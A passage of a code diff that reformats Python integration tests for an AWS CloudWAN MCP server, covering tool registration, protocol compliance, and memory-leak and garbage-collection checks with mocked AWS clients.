             (discover_vpcs, ("us-east-1",), {}),
-            (validate_ip_cidr, ("validate_ip",), {"ip": "10.0.1.100"})
+            (validate_ip_cidr, ("validate_ip",), {"ip": "10.0.1.100"}),
         ]
 
         for tool_func, args, kwargs in tools_to_test:
@@ -243,10 +251,7 @@
         from awslabs.cloudwan_mcp_server.server import trace_network_path, validate_ip_cidr
 
         # Test various error conditions
-        error_tests = [
-            (trace_network_path, ("invalid-ip", "10.0.1.100")),
-            (validate_ip_cidr, ("invalid_operation",))
-        ]
+        error_tests = [(trace_network_path, ("invalid-ip", "10.0.1.100")), (validate_ip_cidr, ("invalid_operation",))]
 
         for tool_func, args in error_tests:
             result = await tool_func(*args)
@@ -270,7 +275,7 @@
             get_global_networks,
             discover_vpcs,
             discover_ip_details,
-            list_network_function_groups
+            list_network_function_groups,
         ]
 
         for tool_func in tools_to_test:
@@ -307,11 +312,7 @@
 class TestMCPProtocolCompliance:
     """Test MCP protocol compliance according to AWS Labs standards."""
 
-    @pytest.mark.parametrize("tool_name", [
-        'trace_network_path',
-        'list_core_networks',
-        'get_global_networks'
-    ])
+    @pytest.mark.parametrize("tool_name", ["trace_network_path", "list_core_networks", "get_global_networks"])
     @pytest.mark.asyncio
     async def test_tool_protocol_interface(self, tool_name):
         """Verify all tools implement required MCP protocol interface."""
@@ -319,10 +320,10 @@
         tools = await mcp.list_tools()
         registered_tools = [tool.name for tool in tools]
         tool_class = next((tool for tool in tools if tool.name == tool_name), None)
-        
+
         assert tool_class is not None, f"Tool {tool_name} not found in registered tools"
-        assert hasattr(tool_class, 'input_schema')
-        assert hasattr(tool_class, 'execute')
+        assert hasattr(tool_class, "input_schema")
+        assert hasattr(tool_class, "execute")
 
     @pytest.mark.asyncio
     async def test_error_response_format(self):
@@ -332,20 +333,12 @@
         result = await validate_ip_cidr("invalid_operation")
         response = json.loads(result)
 
-        assert response == {
-            "success": False,
-            "error": str,
-            "error_code": str
-        }
+        assert response == {"success": False, "error": str, "error_code": str}
 
     @pytest.mark.asyncio
     async def test_required_protocol_methods(self):
         """Verify presence of required MCP protocol methods."""
-        required_methods = [
-            'health_check',
-            'get_server_stats',
-            'validate_configuration'
-        ]
+        required_methods = ["health_check", "get_server_stats", "validate_configuration"]
         for method in required_methods:
             assert hasattr(mcp, method), f"Missing required protocol method: {method}"
 
@@ -369,7 +362,7 @@
             list_core_networks("us-east-1"),
             get_global_networks("us-east-1"),
             discover_vpcs("us-east-1"),
-            list_network_function_groups("us-east-1")
+            list_network_function_groups("us-east-1"),
         ]
         results = await asyncio.gather(*tasks)
         execution_time = time.time() - start_time
@@ -387,10 +380,11 @@
         """Test AWS client caching improves performance."""
         import time
         from awslabs.cloudwan_mcp_server.server import _create_client, get_aws_client
+
         _create_client.cache_clear()  # Clear cache to ensure fresh state
 
-        with patch.dict('os.environ', {'AWS_PROFILE': ''}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {"AWS_PROFILE": ""}, clear=True):
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 # First call - should create client

--- cloudwan-mcp-server/tests/integration/test_mcp_simple.py
+++ cloudwan-mcp-server/tests/integration/test_mcp_simple.py
@@ -41,11 +41,7 @@
 
     # Test environment setup
     env = os.environ.copy()
-    env.update({
-        "AWS_PROFILE": "default",
-        "AWS_DEFAULT_REGION": "us-west-2",
-        "CLOUDWAN_MCP_DEBUG": "true"
-    })
+    env.update({"AWS_PROFILE": "default", "AWS_DEFAULT_REGION": "us-west-2", "CLOUDWAN_MCP_DEBUG": "true"})
 
     # Test 1: Server startup
     logger.info("🧪 Test 1: Server Startup")
@@ -55,12 +51,7 @@
         # Start server process
         cmd = [sys.executable, "-m", "awslabs.cloudwan_mcp_server"]
         process = subprocess.Popen(
-            cmd,
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            env=env,
-            text=True
+            cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True
         )
 
         # Send initialization request
@@ -71,8 +62,8 @@
             "params": {
                 "protocolVersion": "2024-11-05",
                 "capabilities": {},
-                "clientInfo": {"name": "test-client", "version": "1.0.0"}
-            }
+                "clientInfo": {"name": "test-client", "version": "1.0.0"},
+            },
         }
 
         # Send the request
@@ -104,21 +95,11 @@
     try:
         cmd = [sys.executable, "-m", "awslabs.cloudwan_mcp_server"]
         process = subprocess.Popen(
-            cmd,
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            env=env,
-            text=True
+            cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True
         )
 
         # Send list tools request
-        list_tools_request = {
-            "jsonrpc": "2.0",
-            "id": 2,
-            "method": "tools/list",
-            "params": {}
-        }
+        list_tools_request = {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}
 
         process.stdin.write(json.dumps(list_tools_request) + "\n")
         process.stdin.flush()
@@ -152,7 +133,7 @@
             "awslabs.cloudwan_mcp_server.config",
             "awslabs.cloudwan_mcp_server.tools.dynamic_registry",
             "awslabs.cloudwan_mcp_server.tools.core.discovery",
-            "awslabs.cloudwan_mcp_server.tools.cloudwan.policy_management"
+            "awslabs.cloudwan_mcp_server.tools.cloudwan.policy_management",
         ]
 
         for module_name in test_imports:
@@ -190,7 +171,7 @@
             "analyze_network_function_group",
             "list_core_networks",
             "discover_vpcs",
-            "get_global_networks"
+            "get_global_networks",
         ]
 
         found_critical = []
@@ -228,7 +209,6 @@
     logger.info("\n🧪 Test 6: Policy Management Tools Check")
 
     try:
-
         logger.info("✅ Policy management tool classes imported successfully")
         logger.info("   ✓ GetCoreNetworkPolicyTool")
         logger.info("   ✓ GetCoreNetworkChangeSetTool")
@@ -254,6 +234,7 @@
                 AnalyzeNetworkFunctionGroupPoliciesTool,
                 ListNetworkFunctionGroupsTool,
             )
+
             logger.info("✅ NFG tool classes imported successfully")
             logger.info("   ✓ ListNetworkFunctionGroupsTool")
             logger.info("   ✓ AnalyzeNetworkFunctionGroupPoliciesTool")

--- cloudwan-mcp-server/tests/integration/test_mcp_tools.py
+++ cloudwan-mcp-server/tests/integration/test_mcp_tools.py
@@ -14,15 +14,15 @@
 
 
 #!/usr/bin/env python3
-"""Test CloudWAN MCP Tools directly
-"""
+"""Test CloudWAN MCP Tools directly"""
 
 import asyncio
 import os
 import sys
 
 
-sys.path.append('.')
+sys.path.append(".")
+
 
 async def test_mcp_tools():
     """Test the MCP tools directly"""
@@ -61,7 +61,9 @@
     except Exception as e:
         print(f"❌ Error testing MCP tools: {e}")
         import traceback
+
         traceback.print_exc()
 
+
 if __name__ == "__main__":
     asyncio.run(test_mcp_tools())

--- cloudwan-mcp-server/tests/integration/test_memory_load.py
+++ cloudwan-mcp-server/tests/integration/test_memory_load.py
@@ -58,25 +58,25 @@
                 # Create large mock dataset (simulating AWS API response)
                 for i in range(10000):  # 10K items
                     item = {
-                        'CoreNetworkId': f'core-network-{i:08d}',
-                        'GlobalNetworkId': f'global-network-{i:08d}',
-                        'State': 'AVAILABLE',
-                        'Description': f'Memory test core network {i} with extensive metadata and configuration parameters',
-                        'CreatedAt': datetime.now(timezone.utc),
-                        'Tags': [
-                            {'Key': f'Tag{j}', 'Value': f'Value{j}-{i}'}
+                        "CoreNetworkId": f"core-network-{i:08d}",
+                        "GlobalNetworkId": f"global-network-{i:08d}",
+                        "State": "AVAILABLE",
+                        "Description": f"Memory test core network {i} with extensive metadata and configuration parameters",
+                        "CreatedAt": datetime.now(timezone.utc),
+                        "Tags": [
+                            {"Key": f"Tag{j}", "Value": f"Value{j}-{i}"}
                             for j in range(20)  # 20 tags per item
                         ],
-                        'Metadata': {
-                            'ExtensiveConfiguration': {
-                                f'Config{k}': f'ConfigValue{k}-{i}-{k*i}'
+                        "Metadata": {
+                            "ExtensiveConfiguration": {
+                                f"Config{k}": f"ConfigValue{k}-{i}-{k * i}"
                                 for k in range(50)  # 50 config items per item
                             }
-                        }
+                        },
                     }
                     large_dataset.append(item)
 
-                return {'CoreNetworks': large_dataset}
+                return {"CoreNetworks": large_dataset}
 
             mock_client.list_core_networks.side_effect = memory_consuming_operation
             return mock_client
@@ -87,8 +87,9 @@
         process = psutil.Process(os.getpid())
         baseline_memory = process.memory_info().rss / 1024 / 1024  # MB
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=create_memory_intensive_mock_factory):
-
+        with patch(
+            "awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=create_memory_intensive_mock_factory
+        ):
             # Perform multiple operations and monitor memory
             operations_count = 100
 
@@ -96,7 +97,7 @@
                 # Execute memory-intensive operation
                 result = await list_core_networks()
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
                 # Sample memory usage
                 current_memory = process.memory_info().rss / 1024 / 1024
@@ -134,8 +135,10 @@
         memory_retained = final_memory - baseline_memory
         assert memory_retained < 50, f"Too much memory retained after cleanup: {memory_retained:.1f}MB"
 
-        print(f"Memory stats: Avg {average_memory:.1f}MB, 95th {percentile_95:.1f}MB, "
-              f"99th {percentile_99:.1f}MB, Peak {peak_memory:.1f}MB")
+        print(
+            f"Memory stats: Avg {average_memory:.1f}MB, 95th {percentile_95:.1f}MB, "
+            f"99th {percentile_99:.1f}MB, Peak {peak_memory:.1f}MB"
+        )
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -147,10 +150,10 @@
 
         # Test operations that could have memory leaks
         test_operations = [
-            ('list_core_networks', lambda: list_core_networks()),
-            ('get_global_networks', lambda: get_global_networks()),
-            ('discover_vpcs', lambda: discover_vpcs()),
-            ('validate_ip_cidr', lambda: validate_ip_cidr('validate_ip', ip='10.0.0.1'))
+            ("list_core_networks", lambda: list_core_networks()),
+            ("get_global_networks", lambda: get_global_networks()),
+            ("discover_vpcs", lambda: discover_vpcs()),
+            ("validate_ip_cidr", lambda: validate_ip_cidr("validate_ip", ip="10.0.0.1")),
         ]
 
         def create_mock_for_operation(op_name):
@@ -158,45 +161,46 @@
                 mock_client = Mock()
 
                 # Different mock responses for different operations
-                if 'core_networks' in op_name:
+                if "core_networks" in op_name:
                     mock_client.list_core_networks.return_value = {
-                        'CoreNetworks': [
+                        "CoreNetworks": [
                             {
-                                'CoreNetworkId': f'core-network-leak-test-{i}',
-                                'State': 'AVAILABLE',
-                                'LargeData': 'x' * 1000  # 1KB per item
-                            } for i in range(100)
+                                "CoreNetworkId": f"core-network-leak-test-{i}",
+                                "State": "AVAILABLE",
+                                "LargeData": "x" * 1000,  # 1KB per item
+                            }
+                            for i in range(100)
                         ]
                     }
-                elif 'global_networks' in op_name:
+                elif "global_networks" in op_name:
                     mock_client.describe_global_networks.return_value = {
-                        'GlobalNetworks': [
+                        "GlobalNetworks": [
                             {
-                                'GlobalNetworkId': f'global-network-leak-test-{i}',
-                                'State': 'AVAILABLE',
-                                'LargeData': 'y' * 1000
-                            } for i in range(100)
+                                "GlobalNetworkId": f"global-network-leak-test-{i}",
+                                "State": "AVAILABLE",
+                                "LargeData": "y" * 1000,
+                            }
+                            for i in range(100)
                         ]
                     }
-                elif 'vpcs' in op_name:
+                elif "vpcs" in op_name:
                     mock_client.describe_vpcs.return_value = {
-                        'Vpcs': [
-                            {
-                                'VpcId': f'vpc-leak-test-{i}',
-                                'State': 'available',
-                                'LargeData': 'z' * 1000
-                            } for i in range(100)
+                        "Vpcs": [
+                            {"VpcId": f"vpc-leak-test-{i}", "State": "available", "LargeData": "z" * 1000}
+                            for i in range(100)
                         ]
                     }
 
                 return mock_client
+
             return mock_factory
 
         process = psutil.Process(os.getpid())
 
         for op_name, op_func in test_operations:
-
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=create_mock_for_operation(op_name)):
+            with patch(
+                "awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=create_mock_for_operation(op_name)
+            ):
                 gc.collect()
                 initial_memory = process.memory_info().rss / 1024 / 1024
                 memory_baselines[op_name] = initial_memory
@@ -207,7 +211,7 @@
                 for iteration in range(operations_per_test):
                     result = await op_func()
                     parsed = json.loads(result)
-                    assert parsed['success'] is True
+                    assert parsed["success"] is True
 
                     # Sample memory every 10 iterations
                     if iteration % 10 == 0:
@@ -223,20 +227,23 @@
                 if len(memory_progression) >= 3:
                     # Check for consistent upward trend (potential leak)
                     growth_trend = all(
-                        memory_progression[i] >= memory_progression[i-1]
-                        for i in range(1, len(memory_progression))
+                        memory_progression[i] >= memory_progression[i - 1] for i in range(1, len(memory_progression))
                     )
 
                     if growth_trend and total_growth > 20:  # 20MB growth threshold
-                        leak_candidates.append({
-                            'operation': op_name,
-                            'total_growth': total_growth,
-                            'progression': memory_progression,
-                            'final_memory': final_memory
-                        })
+                        leak_candidates.append(
+                            {
+                                "operation": op_name,
+                                "total_growth": total_growth,
+                                "progression": memory_progression,
+                                "final_memory": final_memory,
+                            }
+                        )
 
         # Assert no significant memory leaks detected
-        assert len(leak_candidates) == 0, f"Memory leaks detected in operations: {[lc['operation'] for lc in leak_candidates]}"
+        assert len(leak_candidates) == 0, (
+            f"Memory leaks detected in operations: {[lc['operation'] for lc in leak_candidates]}"
+        )
 
         # Verify memory returns to reasonable baseline
         final_system_memory = process.memory_info().rss / 1024 / 1024
@@ -245,8 +252,9 @@
 
         assert system_growth < 100, f"Overall system memory growth {system_growth:.1f}MB too high"
 
-        print(f"Leak detection complete: {len(test_operations)} operations tested, "
-              f"{len(leak_candidates)} potential leaks")
+        print(
+            f"Leak detection complete: {len(test_operations)} operations tested, {len(leak_candidates)} potential leaks"
+        )
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -264,20 +272,22 @@
 
             def gc_callback(phase, info):
                 """Callback to monitor GC cycles."""
-                if phase == 'start':
+                if phase == "start":
                     process = psutil.Process(os.getpid())
                     current_memory = process.memory_info().rss / 1024 / 1024
-                    gc_cycles.append({
-                        'generation': info['generation'],
-                        'collected': 0,
-                        'memory_at_start': current_memory,
-                        'start_time': time.time()
-                    })
-                elif phase == 'stop':
+                    gc_cycles.append(
+                        {
+                            "generation": info["generation"],
+                            "collected": 0,
+                            "memory_at_start": current_memory,
+                            "start_time": time.time(),
+                        }
+                    )
+                elif phase == "stop":
                     if gc_cycles:
-                        gc_cycles[-1]['collected'] = info['collected']
-                        gc_cycles[-1]['end_time'] = time.time()
-                        gc_cycles[-1]['duration'] = gc_cycles[-1]['end_time'] - gc_cycles[-1]['start_time']
+                        gc_cycles[-1]["collected"] = info["collected"]
+                        gc_cycles[-1]["end_time"] = time.time()
+                        gc_cycles[-1]["duration"] = gc_cycles[-1]["end_time"] - gc_cycles[-1]["start_time"]
 
             # Enable GC debugging (if available)
             original_callbacks = gc.callbacks[:]
@@ -292,10 +302,10 @@
 
                     for i in range(1000):  # Create 1000 temporary objects
                         temp_obj = {
-                            'id': i,
-                            'data': [f'item-{j}' for j in range(100)],  # 100 items each
-                            'metadata': {f'key-{k}': f'value-{k}' for k in range(50)},
-                            'large_string': 'x' * 1000  # 1KB string
+                            "id": i,
+                            "data": [f"item-{j}" for j in range(100)],  # 100 items each
+                            "metadata": {f"key-{k}": f"value-{k}" for k in range(50)},
+                            "large_string": "x" * 1000,  # 1KB string
                         }
                         temporary_objects.append(temp_obj)
 
@@ -305,19 +315,15 @@
 
                     # Return response (temporary objects become garbage)
                     return {
-                        'CoreNetworks': [
-                            {
-                                'CoreNetworkId': f'core-network-gc-{i}',
-                                'State': 'AVAILABLE'
-                            } for i in range(10)
+                        "CoreNetworks": [
+                            {"CoreNetworkId": f"core-network-gc-{i}", "State": "AVAILABLE"} for i in range(10)
                         ]
                     }
 
                 mock_client.list_core_networks.side_effect = pressure_operation
                 return mock_client
 
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=memory_pressure_mock):
-
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=memory_pressure_mock):
                 process = psutil.Process(os.getpid())
                 start_memory = process.memory_info().rss / 1024 / 1024
 
@@ -327,34 +333,34 @@
                 for i in range(operations_count):
                     result = await list_core_networks()
                     parsed = json.loads(result)
-                    assert parsed['success'] is True
+                    assert parsed["success"] is True
 
                     # Force some GC activity
                     if i % 5 == 0:
                         collected = gc.collect()
                         current_memory = process.memory_info().rss / 1024 / 1024
-                        memory_during_gc.append({
-                            'iteration': i,
-                            'collected_objects': collected,
-                            'memory_mb': current_memory - start_memory
-                        })
+                        memory_during_gc.append(
+                            {"iteration": i, "collected_objects": collected, "memory_mb": current_memory - start_memory}
+                        )
 
                 end_memory = process.memory_info().rss / 1024 / 1024
                 memory_growth = end_memory - start_memory
 
             # Analyze GC behavior
             if gc_cycles:
-                total_gc_time = sum(cycle.get('duration', 0) for cycle in gc_cycles)
+                total_gc_time = sum(cycle.get("duration", 0) for cycle in gc_cycles)
                 avg_gc_time = total_gc_time / len(gc_cycles) if gc_cycles else 0
-                total_collected = sum(cycle.get('collected', 0) for cycle in gc_cycles)
+                total_collected = sum(cycle.get("collected", 0) for cycle in gc_cycles)
 
                 # GC should be working effectively
                 assert avg_gc_time < 0.1, f"Average GC time {avg_gc_time:.4f}s too high"
                 assert total_collected > 0, "GC should have collected objects"
                 assert len(gc_cycles) > 0, "GC should have been triggered"
 
-                print(f"GC stats: {len(gc_cycles)} cycles, {total_collected} objects collected, "
-                      f"{total_gc_time:.3f}s total GC time")
+                print(
+                    f"GC stats: {len(gc_cycles)} cycles, {total_collected} objects collected, "
+                    f"{total_gc_time:.3f}s total GC time"
+                )
 
             # Memory should be managed effectively under GC pressure
             assert memory_growth < 100, f"Memory growth under GC pressure: {memory_growth:.1f}MB"
@@ -378,61 +384,57 @@
             def large_response_operation(**kwargs):
                 # Create response with large objects
                 large_policy = {
-                    'version': '2021.12',
-                    'core-network-configuration': {
-                        'asn-ranges': ['64512-64555'],
-                        'edge-locations': [{'location': 'us-east-1'}]
+                    "version": "2021.12",
+                    "core-network-configuration": {
+                        "asn-ranges": ["64512-64555"],
+                        "edge-locations": [{"location": "us-east-1"}],
                     },
-                    'massive-segments': [
+                    "massive-segments": [
                         {
-                            'name': f'segment-{i:06d}',
-                            'description': 'x' * 10000,  # 10KB description
-                            'large-configuration': {
-                                f'config-{j}': 'y' * 1000  # 1KB per config * 100 configs = 100KB
+                            "name": f"segment-{i:06d}",
+                            "description": "x" * 10000,  # 10KB description
+                            "large-configuration": {
+                                f"config-{j}": "y" * 1000  # 1KB per config * 100 configs = 100KB
                                 for j in range(100)
-                            }
+                            },
                         }
                         for i in range(100)  # 100 segments * ~110KB = ~11MB per response
-                    ]
+                    ],
                 }
 
-                return {
-                    'CoreNetworkPolicy': {
-                        'PolicyVersionId': '1',
-                        'PolicyDocument': json.dumps(large_policy)
-                    }
-                }
+                return {"CoreNetworkPolicy": {"PolicyVersionId": "1", "PolicyDocument": json.dumps(large_policy)}}
 
             mock_client.get_core_network_policy.side_effect = large_response_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=large_object_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=large_object_mock):
             process = psutil.Process(os.getpid())
             initial_memory = process.memory_info().rss / 1024 / 1024
 
             # Create and process large objects
             for iteration in range(10):
-                result = await get_core_network_policy('core-network-large-object-test')
+                result = await get_core_network_policy("core-network-large-object-test")
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
                 # Extract large object for analysis
-                policy_doc = json.loads(parsed['policy_document'])
+                policy_doc = json.loads(parsed["policy_document"])
                 large_objects.append(policy_doc)
 
                 # Calculate object size
-                obj_size = sys.getsizeof(json.dumps(policy_doc).encode('utf-8')) / 1024 / 1024  # MB
+                obj_size = sys.getsizeof(json.dumps(policy_doc).encode("utf-8")) / 1024 / 1024  # MB
                 object_sizes.append(obj_size)
 
                 # Take heap snapshot
                 current_memory = process.memory_info().rss / 1024 / 1024
-                heap_snapshots.append({
-                    'iteration': iteration,
-                    'memory_mb': current_memory - initial_memory,
-                    'object_count': len(large_objects),
-                    'largest_object_mb': obj_size
-                })
+                heap_snapshots.append(
+                    {
+                        "iteration": iteration,
+                        "memory_mb": current_memory - initial_memory,
+                        "object_count": len(large_objects),
+                        "largest_object_mb": obj_size,
+                    }
+                )
 
                 # Periodically clear old objects to test garbage collection
                 if iteration % 3 == 0 and len(large_objects) > 3:
@@ -460,8 +462,10 @@
                 memory_efficiency = total_object_size / total_memory_growth if total_memory_growth > 0 else 0
                 assert memory_efficiency > 0.3, f"Memory efficiency {memory_efficiency:.2f} too low"
 
-            print(f"Large objects: Avg {avg_object_size:.1f}MB, Max {max_object_size:.1f}MB, "
-                  f"Total growth {total_memory_growth:.1f}MB")
+            print(
+                f"Large objects: Avg {avg_object_size:.1f}MB, Max {max_object_size:.1f}MB, "
+                f"Total growth {total_memory_growth:.1f}MB"
+            )
 
 
 class TestCircularReferenceDetection:
@@ -479,21 +483,17 @@
 
             def circular_response_operation(**kwargs):
                 # Create objects with circular references
-                parent_obj = {
-                    'id': len(circular_objects),
-                    'type': 'parent',
-                    'children': []
-                }
+                parent_obj = {"id": len(circular_objects), "type": "parent", "children": []}
 
                 # Create child objects that reference parent
                 for i in range(10):
                     child_obj = {
-                        'id': i,
-                        'type': 'child',
-                        'parent': parent_obj,  # Circular reference
-                        'data': 'x' * 1000  # 1KB data
+                        "id": i,
+                        "type": "child",
+                        "parent": parent_obj,  # Circular reference
+                        "data": "x" * 1000,  # 1KB data
                     }
-                    parent_obj['children'].append(child_obj)
+                    parent_obj["children"].append(child_obj)
 
                 # Create weak reference for monitoring
                 weak_parent = weakref.ref(parent_obj)
@@ -501,11 +501,11 @@
                 circular_objects.append(parent_obj)
 
                 return {
-                    'CoreNetworks': [
+                    "CoreNetworks": [
                         {
-                            'CoreNetworkId': f'core-network-circular-{parent_obj["id"]}',
-                            'State': 'AVAILABLE',
-                            'CircularData': parent_obj
+                            "CoreNetworkId": f"core-network-circular-{parent_obj['id']}",
+                            "State": "AVAILABLE",
+                            "CircularData": parent_obj,
                         }
                     ]
                 }
@@ -513,8 +513,7 @@
             mock_client.list_core_networks.side_effect = circular_response_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=circular_reference_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=circular_reference_mock):
             process = psutil.Process(os.getpid())
             initial_memory = process.memory_info().rss / 1024 / 1024
 
@@ -524,7 +523,7 @@
             for i in range(operations_count):
                 result = await list_core_networks()
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
                 # Periodically force cleanup
                 if i % 5 == 0:
@@ -554,8 +553,7 @@
             assert cleanup_ratio > 0.8, f"Cleanup ratio {cleanup_ratio:.2f} too low"
             assert final_alive_objects <= operations_count * 0.1, f"Too many objects still alive: {final_alive_objects}"
 
-            print(f"Circular reference cleanup: {cleanup_ratio:.2f} cleanup ratio, "
-                  f"{memory_growth:.1f}MB memory growth")
+            print(f"Circular reference cleanup: {cleanup_ratio:.2f} cleanup ratio, {memory_growth:.1f}MB memory growth")
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -567,10 +565,7 @@
 
         def weakref_callback(weak_ref):
             """Callback when object is about to be garbage collected."""
-            callback_invocations.append({
-                'timestamp': time.time(),
-                'weak_ref_id': id(weak_ref)
-            })
+            callback_invocations.append({"timestamp": time.time(), "weak_ref_id": id(weak_ref)})
 
         def weakref_aware_mock(service, region=None):
             mock_client = Mock()
@@ -578,16 +573,13 @@
             def weakref_operation(**kwargs):
                 # Create object that will be managed with weak references
                 large_data_object = {
-                    'id': len(strong_references),
-                    'large_data': 'x' * 100000,  # 100KB object
-                    'metadata': {
-                        'created_at': time.time(),
-                        'size_kb': 100
-                    }
+                    "id": len(strong_references),
+                    "large_data": "x" * 100000,  # 100KB object
+                    "metadata": {"created_at": time.time(), "size_kb": 100},
                 }
 
                 # Store strong reference temporarily
-                obj_id = f'obj-{len(strong_references):04d}'
+                obj_id = f"obj-{len(strong_references):04d}"
                 strong_references[obj_id] = large_data_object
 
                 # Create weak reference with callback
@@ -595,33 +587,32 @@
                 weak_references[obj_id] = weak_ref
 
                 return {
-                    'Routes': [
+                    "Routes": [
                         {
-                            'DestinationCidrBlock': f'10.{len(strong_references)}.0.0/16',
-                            'State': 'active',
-                            'LargeDataRef': obj_id
+                            "DestinationCidrBlock": f"10.{len(strong_references)}.0.0/16",
+                            "State": "active",
+                            "LargeDataRef": obj_id,
                         }
                     ]
                 }
 
             mock_client.search_transit_gateway_routes.side_effect = weakref_operation
             return mock_client
-
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=weakref_aware_mock):
 
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=weakref_aware_mock):
             process = psutil.Process(os.getpid())
             initial_memory = process.memory_info().rss / 1024 / 1024
 
             # Create objects and manage with weak references
             for i in range(50):
-                result = await analyze_tgw_routes(f'tgw-rtb-weakref-{i:03d}')
+                result = await analyze_tgw_routes(f"tgw-rtb-weakref-{i:03d}")
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
                 # Periodically clear strong references (keep weak refs)
                 if i % 10 == 0 and i > 0:
                     # Clear half of strong references
-                    keys_to_remove = list(strong_references.keys())[:len(strong_references)//2]
+                    keys_to_remove = list(strong_references.keys())[: len(strong_references) // 2]
                     for key in keys_to_remove:
                         del strong_references[key]
 
@@ -629,13 +620,9 @@
                     gc.collect()
 
                     # Verify weak references are cleaned up
-                    alive_weak_refs = sum(
-                        1 for weak_ref in weak_references.values()
-                        if weak_ref() is not None
-                    )
+                    alive_weak_refs = sum(1 for weak_ref in weak_references.values() if weak_ref() is not None)
 
-                    print(f"Iteration {i}: {len(strong_references)} strong refs, "
-                          f"{alive_weak_refs} alive weak refs")
+                    print(f"Iteration {i}: {len(strong_references)} strong refs, {alive_weak_refs} alive weak refs")
 
             # Final cleanup
             strong_references.clear()
@@ -645,10 +632,7 @@
             memory_growth = final_memory - initial_memory
 
             # Count final weak reference states
-            final_alive_weak_refs = sum(
-                1 for weak_ref in weak_references.values()
-                if weak_ref() is not None
-            )
+            final_alive_weak_refs = sum(1 for weak_ref in weak_references.values() if weak_ref() is not None)
 
             total_weak_refs = len(weak_references)
             cleanup_effectiveness = (total_weak_refs - final_alive_weak_refs) / total_weak_refs
@@ -659,8 +643,10 @@
             assert len(callback_invocations) > 0, "Weak reference callbacks should be invoked"
             assert final_alive_weak_refs <= 5, f"Too many weak refs still alive: {final_alive_weak_refs}"
 
-            print(f"Weak references: {cleanup_effectiveness:.2f} cleanup effectiveness, "
-                  f"{len(callback_invocations)} callbacks invoked")
+            print(
+                f"Weak references: {cleanup_effectiveness:.2f} cleanup effectiveness, "
+                f"{len(callback_invocations)} callbacks invoked"
+            )
 
 
 class TestMemoryFragmentation:
@@ -683,37 +669,35 @@
 
                 # Mix of small, medium, and large allocations
                 allocation_sizes = [
-                    ('small', 100),    # 100 bytes
-                    ('medium', 10000), # 10KB
-                    ('large', 1000000) # 1MB
+                    ("small", 100),  # 100 bytes
+                    ("medium", 10000),  # 10KB
+                    ("large", 1000000),  # 1MB
                 ]
 
                 for alloc_type, size in allocation_sizes:
                     for i in range(10):  # 10 of each size
                         data = {
-                            'type': alloc_type,
-                            'id': i,
-                            'data': 'x' * size,
-                            'metadata': {
-                                'allocation_time': time.time(),
-                                'size_bytes': size
-                            }
+                            "type": alloc_type,
+                            "id": i,
+                            "data": "x" * size,
+                            "metadata": {"allocation_time": time.time(), "size_bytes": size},
                         }
                         allocations.append(data)
 
                 # Randomly delete some allocations to create holes
                 import random
+
                 random.shuffle(allocations)
-                allocations = allocations[:len(allocations)//2]  # Keep only half
+                allocations = allocations[: len(allocations) // 2]  # Keep only half
 
                 allocation_patterns.append(allocations)
 
                 return {
-                    'GlobalNetworks': [
+                    "GlobalNetworks": [
                         {
-                            'GlobalNetworkId': f'global-network-frag-{len(allocation_patterns)}',
-                            'State': 'AVAILABLE',
-                            'Allocations': len(allocations)
+                            "GlobalNetworkId": f"global-network-frag-{len(allocation_patterns)}",
+                            "State": "AVAILABLE",
+                            "Allocations": len(allocations),
                         }
                     ]
                 }
@@ -721,8 +705,7 @@
             mock_client.describe_global_networks.side_effect = fragmented_allocation_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=fragmentation_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=fragmentation_mock):
             process = psutil.Process(os.getpid())
 
             # Perform operations with fragmentation patterns
@@ -731,7 +714,7 @@
 
                 result = await get_global_networks()
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
                 post_alloc_memory = process.memory_info().rss / 1024 / 1024
                 memory_growth = post_alloc_memory - initial_memory
@@ -745,26 +728,32 @@
                     memory_released = post_alloc_memory - post_gc_memory
 
                     fragmentation_ratio = memory_released / memory_growth if memory_growth > 0 else 0
-                    fragmentation_metrics.append({
-                        'cycle': cycle,
-                        'growth_mb': memory_growth,
-                        'released_mb': memory_released,
-                        'fragmentation_ratio': fragmentation_ratio
-                    })
+                    fragmentation_metrics.append(
+                        {
+                            "cycle": cycle,
+                            "growth_mb": memory_growth,
+                            "released_mb": memory_released,
+                            "fragmentation_ratio": fragmentation_ratio,
+                        }
+                    )
 
             # Analyze fragmentation
             if fragmentation_metrics:
-                avg_fragmentation = sum(m['fragmentation_ratio'] for m in fragmentation_metrics) / len(fragmentation_metrics)
